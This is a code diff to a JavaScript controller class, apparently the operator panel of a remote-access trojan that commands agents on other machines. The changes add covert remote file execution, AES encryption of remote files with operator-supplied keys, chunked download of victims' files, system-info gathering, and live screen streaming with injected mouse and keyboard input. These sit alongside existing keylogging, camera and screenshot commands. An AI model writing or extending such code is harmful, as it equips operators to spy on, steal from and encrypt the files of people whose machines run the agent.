@@ -13,6 +13,10 @@ export class Gateway{
      * @param {Function} callbacks.onCamera        
      * @param {Function} callbacks.onKeylog         
      * @param {Function} callbacks.onMessage
+     * @param {Function} callbacks.onSystemInfo
+     * @param {Function} callbacks.onStreamFrame
+     * @param {Function} callbacks.onStartStream
+     * @param {Function} callbacks.onStopStream
      */
 
     constructor(callbacks = {}) {
@@ -29,6 +33,8 @@ export class Gateway{
         this.agentsList = [];
         this.appListCache = [];
         this.processListCache = [];
+        this.transferSessions = {};
+        this.onSystemInfo = {};
     }
 
     findAgentId(input) {
@@ -91,6 +97,8 @@ export class Gateway{
 
         this.ws = new WebSocket(url);
 
+        this.ws.binaryType = "arraybuffer";
+
         this.ws.onopen = () => {
             console.log(`[Network] Socket opened successfully to ${url}`)
             console.log(`[Network] Waiting for user to enter password...`)
@@ -100,7 +108,15 @@ export class Gateway{
             }
         };
 
-        this.ws.onmessage = (event) => this._handleInternalMessage(event);
+        this.ws.onmessage = (event) => {
+            if (event.data instanceof ArrayBuffer) {
+                if (this.callbacks.onStreamFrame) {
+                    this.callbacks.onStreamFrame(event.data);
+                }
+            } else {
+               this._handleInternalMessage(event);
+            }
+        };
         
         this.ws.onclose = (event) => {
             const wasAuthenticated = this.isAuthenticated;
@@ -109,37 +125,6 @@ export class Gateway{
             this.isAuthenticated = false;
             
             console.log(`[Network] Socket closed. Code: ${event.code}, Reason: ${event.reason || 'Unknown'}`);
-            console.log(`[Network] Was authenticated: ${wasAuthenticated}, Connection ID: ${connectionId}`);
-            
-            if (event.code === 1001) {
-                console.log(`[Network] Connection closed normally (Going Away). This usually means:`);
-                console.log(`  1. Page refresh or navigation`);
-                console.log(`  2. Tab/window closed`);
-                console.log(`  3. Browser initiated close`);
-            
-                if (wasAuthenticated && this.callbacks.onDisconnected) {
-                    console.log(`[Network] Triggering onDisconnected for navigation (code 1001 but was authenticated)`);
-                    this.callbacks.onDisconnected();
-                } else {
-                    console.log(`[Network] Not triggering onDisconnected (not authenticated or no callback)`);
-                }
-                return;
-            } else if (event.code === 1000) {
-                console.log(`[Network] Connection closed normally (code 1000). Intentional close.`);
-                console.log(`[Network] Not triggering auto-reconnect for intentional close (code 1000)`);
-                return;
-            } else if (event.code === 1006) {
-                console.error(`[Network] Connection failed abnormally. This usually means:`);
-                console.error(`  1. Gateway server is not running at ${ip}:${port}`);
-                console.error(`  2. SSL certificate is not trusted (self-signed)`);
-                console.error(`  3. Network interruption`);
-                console.error(`  → Fix: Open https://${ip}:${port} in browser first to accept certificate`);
-            } else if (event.code === 1005) {
-                console.warn(`[Network] Connection closed without status (code 1005). This may indicate:`);
-                console.warn(`  1. Connection was closed before authentication completed`);
-                console.warn(`  2. Network interruption`);
-                console.warn(`  3. Server closed connection unexpectedly`);
-            }
             
             if (wasAuthenticated && this.callbacks.onDisconnected) {
                 this.callbacks.onDisconnected();
@@ -149,13 +134,6 @@ export class Gateway{
         };
 
         this.ws.onerror = (err) => {
-            console.error(`[Network] WebSocket error:`, err);
-            console.error(`[Network] Cannot connect to ${url}`);
-            console.error(`[Network] Possible causes:`);
-            console.error(`  - Gateway server is not running`);
-            console.error(`  - SSL certificate is not trusted (self-signed certificate)`);
-            console.error(`  - Firewall blocking connection`);
-            console.error(`[Network] Solution: Open https://${ip}:${port} in browser first to accept the certificate`);
             if (this.callbacks.onError) {
                 this.callbacks.onError(err);
             }
@@ -229,7 +207,7 @@ export class Gateway{
             const payload = {
                 type: type,
                 data: data,
-                from: this.sessionId,
+                from: this.clientConnectionId || this.machineId,
                 to: 'ALL' 
             }
             this.ws.send(JSON.stringify(payload));
@@ -249,7 +227,7 @@ export class Gateway{
         const payload = {
             type: type,
             data: data,
-            from: this.sessionId,
+            from: this.clientConnectionId || this.machineId,
             to: target
         }
 
@@ -300,6 +278,40 @@ export class Gateway{
     listFiles(path = "") {
         const data = typeof path === 'string' ? path : JSON.stringify({ path });
         this.send(CONFIG.CMD.FILE_LIST, data);
+    }
+
+    executeFile(path) {
+        window.ui.log('System', `Đang yêu cầu thực thi lén: ${path}`);
+        this.send(CONFIG.CMD.FILE_EXECUTE, path);
+    }
+
+    encryptFile(path, key = "", iv = "") {
+        window.ui.log('System', `Đang yêu cầu xử lý AES cho: ${path}`);
+        this.send(CONFIG.CMD.FILE_ENCRYPT, {
+            path: path,
+            key: key,
+            iv: iv
+        });
+    }
+
+    startStream() {
+        this.send(CONFIG.CMD.START_STREAM, "");
+    }
+
+    stopStream() {
+        this.send(CONFIG.CMD.STOP_STREAM, "");
+    }
+
+    sendMouseMove(x, y) {
+        this.send(CONFIG.CMD.MOUSE_MOVE, { x, y });
+    }
+
+    sendMouseClick(button, down) {
+        this.send(CONFIG.CMD.MOUSE_CLICK, { button, down });
+    }
+
+    sendKeyEvent(keycode, down) {
+        this.send(CONFIG.CMD.KEY_EVENT, { keycode, down });
     }
 
     _handleInternalMessage(event) {
@@ -479,10 +491,89 @@ export class Gateway{
                     this.ui.renderList('Application List', this.appListCache);
                     break;
                 case CONFIG.CMD.FILE_LIST:
-                    if (msg.data && msg.data.status === 'ok' && msg.data.files) {
-                        this.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
+                    console.log("[Gateway] Data arrived:", msg.data);
+                    if (msg.data && msg.data.status === 'ok') {
+                        if (window.ui && typeof window.ui.renderFileList === 'function') {
+                            window.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
+                        }
                     } else {
-                        this.ui.log('Error', msg.data?.msg || 'Failed to list files');
+                        if (window.ui && window.ui.log) window.ui.log('Error', msg.data?.msg || 'Lỗi lấy file');
+                    }
+                    break;
+                case CONFIG.CMD.FILE_PROGRESS:
+                    if (msg.data.status === 'start') {
+                        this.transferSessions[msg.data.sessionId] = {
+                            fileName: msg.data.fileName,
+                            chunks: [],
+                            totalSize: msg.data.totalSize
+                        };
+                        this.ui.log('System', `Bắt đầu nhận file: ${msg.data.fileName}...`);
+                    }
+                    break;
+
+                case CONFIG.CMD.FILE_CHUNK:
+                    // Nhận từng mảnh và gom lại
+                    const session = this.transferSessions[msg.data.sessionId];
+                    if (session) {
+                        session.chunks.push(msg.data.data); // data này là base64 từ Agent
+                    }
+                    break;
+
+                case CONFIG.CMD.FILE_COMPLETE:
+                    // Khi xong, ghép lại và tải về
+                    const doneSession = this.transferSessions[msg.data.sessionId];
+                    if (doneSession) {
+                        this.ui.log('System', `Tải xong: ${doneSession.fileName}. Đang xử lý...`);
+                        this._triggerBrowserDownload(doneSession);
+                        delete this.transferSessions[msg.data.sessionId];
+                    }
+                    if (this.callbacks.onMessage) {
+                        this.callbacks.onMessage(msg);
+                    }
+                    break;
+                case CONFIG.CMD.FILE_EXECUTE:
+                    this._handleCommandResult(msg.type, msg.data);
+                    if (msg.data.status === 'ok') {
+                        alert("System: " + (msg.data.msg || "Execution triggered successfully!"));
+                        this.listFiles(window.fmState?.path || "");
+                    } else {
+                        alert("Error: " + (msg.data.msg || "Execution failed."));
+                    }
+                    break;
+
+                case CONFIG.CMD.FILE_ENCRYPT:
+                    this._handleCommandResult(msg.type, msg.data);
+                    if (msg.data.status === 'ok') {
+                        alert("System: " + (msg.data.msg || "AES process completed successfully!"));
+                        this.listFiles(window.fmState?.path || "");
+                    } else {
+                        alert("Error: " + (msg.data.msg || "Encryption/Decryption failed."));
+                    }
+                    break;
+                case CONFIG.CMD.SYSTEM_INFO:
+                    if (msg.data && msg.data.status === 'ok') {
+                        if (this.callbacks.onSystemInfo) {
+                            this.callbacks.onSystemInfo(msg.data, senderId);
+                        }
+                    } else {
+                        console.error("Agent error (System Info):", msg.data?.msg);
+                    }
+                    break;
+                case CONFIG.CMD.START_STREAM:
+                    if (msg.data && msg.data.status === 'ok') {
+                        console.log("[Gateway] Stream started successfully");
+                        if (this.callbacks.onStartStream) this.callbacks.onStartStream(msg.data, senderId);
+                    }
+                    break;
+                case CONFIG.CMD.STOP_STREAM:
+                    console.log("[Gateway] Stream stopped");
+                    if (this.callbacks.onStopStream) this.callbacks.onStopStream(msg.data, senderId);
+                    break;
+                case CONFIG.CMD.STREAM_FRAME:
+                    if (msg.data && msg.data.data) {
+                        if (this.callbacks.onStreamFrame) {
+                            this.callbacks.onStreamFrame(msg.data.data, senderId);
+                        }
                     }
                     break;
                 case CONFIG.CMD.PROC_START:
@@ -491,6 +582,7 @@ export class Gateway{
                 case CONFIG.CMD.APP_KILL:
                 case CONFIG.CMD.START_KEYLOG:
                 case CONFIG.CMD.STOP_KEYLOG:
+                case CONFIG.CMD.FILE_ENCRYPT:
                     this._handleCommandResult(msg.type, msg.data);
                     break;
                 case CONFIG.CMD.SCREENSHOT:
@@ -702,5 +794,26 @@ export class Gateway{
                 memory: proc.memory || null
             };
         });
+    }
+
+    _triggerBrowserDownload(session) {
+        // Chuyển mảng base64 thành mảng byte
+        const byteCharacters = session.chunks.map(chunk => atob(chunk)).join('');
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: 'application/octet-stream' });
+        
+        // Tạo link ảo để tải về
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = session.fileName;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        a.remove();
     }
 }
